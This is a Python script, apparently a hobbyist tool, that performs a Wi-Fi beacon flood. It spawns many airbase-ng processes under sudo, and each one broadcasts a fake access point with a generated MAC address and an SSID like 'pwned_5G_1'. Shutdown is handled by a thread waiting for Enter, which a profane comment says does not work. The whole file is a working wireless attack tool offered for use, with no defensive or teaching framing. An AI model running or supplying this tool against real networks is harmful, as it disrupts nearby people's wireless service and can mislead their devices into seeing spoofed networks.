#!/usr/bin/env python3
import sys
import time
import subprocess
import argparse
import threading
import os

def generate_mac(index):
    return f"00:14:24:{hex(index >> 16 & 0xff)[2:].zfill(2)}:{hex(index >> 8 & 0xff)[2:].zfill(2)}:{hex(index & 0xff)[2:].zfill(2)}"

def wait_for_input(stop_event):
    try:
        input('IF U WANNA STOP JUST PRESS ENTER\n')
    except (KeyboardInterrupt, EOFError):
        pass
    stop_event.set()

def launch_aps(interface, count, prefix, channel):
    processes = []
    print("-" * 60)

    devnull = open(os.devnull, 'wb')

    for i in range(1, count + 1):
        ssid = f"{prefix}_{i}"
        mac = generate_mac(i)
        
        cmd = ['sudo', "airbase-ng", "-a", mac, "-e", ssid, "-c", str(channel), "-C", "25", "-X", interface]
        
        proc = subprocess.Popen(cmd, stdout=devnull, stderr=devnull, close_fds=True)
        processes.append(proc)
        
        print(f"[+] Deployed #{i}: SSID='{ssid}' | MAC=[{mac}] (PID: {proc.pid})\n")
        
        time.sleep(0.2)
        
    print("-" * 60)
    print(f"[*] All {count} deployed")
    
    """

    This fucking stopper do not work TwT

    """

    stop_event = threading.Event()
    input_thread = threading.Thread(target=wait_for_input, args=(stop_event,), daemon=True)
    input_thread.start()

    try:
        while not stop_event.is_set():
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[-] Ctrl+C detected!")

    print("[-] Closing subprocesses, please wait...")
    for proc in processes:
        try:
            proc.terminate()
            proc.wait(timeout=0.2)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
                
    devnull.close()
    print("All is cleared")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Beacon Flood via airbase-ng subprocess span")
    parser.add_argument("interface", help="Interface name")
    parser.add_argument("-c", "--count", type=int, default=15, help="Networks amount")
    parser.add_argument("-p", "--prefix", default="pwned_5G", help="Prefix for created subnets")
    parser.add_argument("-ch", "--channel", type=int, default=36, help="Channel (1, 6, 11, 36, 40, 44, 48)")

    args = parser.parse_args()
    
    if args.count > 50:
        print("[!] ATTENTION [!] U are playing risky. A lot of beacons can shut your os! Proceed with caution")
        confirm = input("[?] Yea or nope (y/n): ")
        if confirm.lower() != 'y':
            sys.exit()

    launch_aps(args.interface, args.count, args.prefix, args.channel)

